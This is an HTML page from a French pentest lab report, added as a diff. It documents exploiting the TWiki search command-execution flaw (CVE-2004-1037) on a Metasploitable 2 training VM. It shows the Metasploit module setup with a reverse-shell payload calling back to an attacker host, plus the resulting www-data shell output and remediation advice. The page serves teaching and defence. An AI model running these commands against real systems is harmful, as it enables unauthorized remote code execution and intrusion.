@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>TWiki Search — RCE — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">TWiki — fonction de recherche</h1>
+    <h2 class="doc-subtitle">Expression de recherche évaluée sans filtrage → exécution de commande (RCE)</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>TWiki (wiki Perl) — port <code class="mono">80</code>, <code>/twiki/</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 2 — <code class="mono">192.168.56.101</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2004-1037">CVE-2004-1037</a></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>RCE www-data</strong> (shell de commande, sans authentification)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <h2 class="section">1. Identification</h2>
+  <p>TWiki est un wiki écrit en Perl, listé sur la page d'accueil du serveur. Sa fonction de
+  <strong>recherche</strong> évalue l'expression fournie d'une manière insuffisamment filtrée :
+  en y glissant des métacaractères (backticks), on fait exécuter une commande arbitraire côté
+  serveur, sans authentification. Faille distincte des autres applis du port 80.</p>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p>Première question : cette fonction a-t-elle une faille connue ?</p>
+
+  <pre class="terminal">$ searchsploit twiki
+
+TWiki 20030201 - 'search.pm' Remote Command Execution        | cgi/webapps/642.pl
+TWiki - Search Function Arbitrary Command Execution (Metasp)  | php/webapps/16894.rb</pre>
+
+  <p>Chemin du module dans <code>msfconsole</code> :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "search twiki; exit"
+
+#  Full Name                         Disclosure Date  Rank       Check  Name
+4  exploit/unix/webapp/twiki_search  2004-10-01       excellent  Yes    TWiki Search Function Arbitrary Command Execution</pre>
+
+  <p>Puis la CVE et le mécanisme :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2004-1037
+  https://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithSearch</pre>
+
+  <p>La section <code>References</code> confirme <strong>CVE-2004-1037</strong> : la fonction
+  <code>search</code> passe l'expression de recherche à une évaluation Perl insuffisamment
+  filtrée ; en y injectant des backticks, on fait exécuter une commande shell par le serveur
+  web (<code>www-data</code>).</p>
+
+  <blockquote class="evidence">
+    Une recherche forgée dans TWiki exécute une commande arbitraire côté serveur &mdash; sans
+    authentification, avec les droits <code>www-data</code>.
+  </blockquote>
+
+  <figure class="capture" id="cap-recherche">
+    <img src="../images/ms2-twiki/01-recherche-module.png" alt="searchsploit twiki puis search twiki dans msfconsole">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc"><code>searchsploit twiki</code> confirme l'exécution de commande via la
+      recherche, puis <code>search twiki</code> donne le chemin du module
+      (<code>exploit/unix/webapp/twiki_search</code>).</span>
+      <span class="fname">images/ms2-twiki/01-recherche-module.png</span>
+    </figcaption>
+  </figure>
+
+  <figure class="capture" id="cap-info-cve">
+    <img src="../images/ms2-twiki/02-info-cve.png" alt="info du module, section References avec la CVE">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Résultat de <code>info</code> sur le module : la section
+      <code>References</code> donne <strong>CVE-2004-1037</strong>.</span>
+      <span class="fname">images/ms2-twiki/02-info-cve.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <p>Démarche interactive dans <code>msfconsole</code>, commande par commande :</p>
+
+  <pre class="terminal">msf6 > use exploit/unix/webapp/twiki_search
+msf6 exploit(unix/webapp/twiki_search) > set RHOSTS 192.168.56.101
+msf6 exploit(unix/webapp/twiki_search) > set RPORT 80
+msf6 exploit(unix/webapp/twiki_search) > set URI /twiki/bin
+msf6 exploit(unix/webapp/twiki_search) > set payload cmd/unix/reverse
+msf6 exploit(unix/webapp/twiki_search) > set LHOST 192.168.56.1
+msf6 exploit(unix/webapp/twiki_search) > set LPORT 4448</pre>
+
+  <p><strong class="field">Point d'attention —</strong> <code>URI /twiki/bin</code> est le
+  chemin des scripts CGI de TWiki (valeur par défaut du module, correcte ici) ;
+  <code>LHOST</code>/<code>LPORT</code> pour le reverse shell.</p>
+
+  <figure class="capture" id="cap-config">
+    <img src="../images/ms2-twiki/03-exploit-config.png" alt="Configuration du module avant lancement">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc">Chargement du module et configuration des options (cible, URI,
+      payload, LHOST/LPORT).</span>
+      <span class="fname">images/ms2-twiki/03-exploit-config.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>La phase <code>check</code> confirme la cible vulnérable, puis l'envoi de la recherche
+  forgée ouvre le shell :</p>
+
+  <pre class="terminal">msf6 exploit(unix/webapp/twiki_search) > run -z
+[+] The target is vulnerable.
+[*] Command shell session 1 opened (192.168.56.1:4448 -> 192.168.56.101:49053)
+msf6 exploit(unix/webapp/twiki_search) > sessions -c "id; uname -a; hostname; whoami" -i 1
+[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+metasploitable
+www-data</pre>
+
+  <p>Accès confirmé en <strong><code>www-data</code></strong> : la commande injectée via la
+  recherche s'exécute avec les droits du serveur web. Même faille que le TWiki de MS1
+  (CVE-2004-1037), reconfirmée sur MS2.</p>
+
+  <figure class="capture" id="cap-preuve">
+    <img src="../images/ms2-twiki/04-session-www-data.png" alt="Shell www-data confirmé, uid=33">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc">Cible vulnérable (<code>check</code>), ouverture de session et sortie
+      de <code>id; uname -a; hostname; whoami</code> : accès <code>uid=33(www-data)</code>.</span>
+      <span class="fname">images/ms2-twiki/04-session-www-data.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Mettre à jour TWiki vers une version corrigée (l'évaluation de la recherche a été
+      sécurisée après cette CVE).</li>
+      <li>Ne jamais évaluer d'entrée utilisateur comme du code (Perl <code>eval</code>) ;
+      filtrer strictement l'expression de recherche.</li>
+      <li>Restreindre l'exposition réseau de l'application et appliquer le moindre privilège au
+      compte du serveur web.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms2/josa/twiki.md"><code>ms2/josa/twiki.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2004-1037 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2004-1037">nvd.nist.gov/vuln/detail/CVE-2004-1037</a></li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — TWiki Search RCE</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
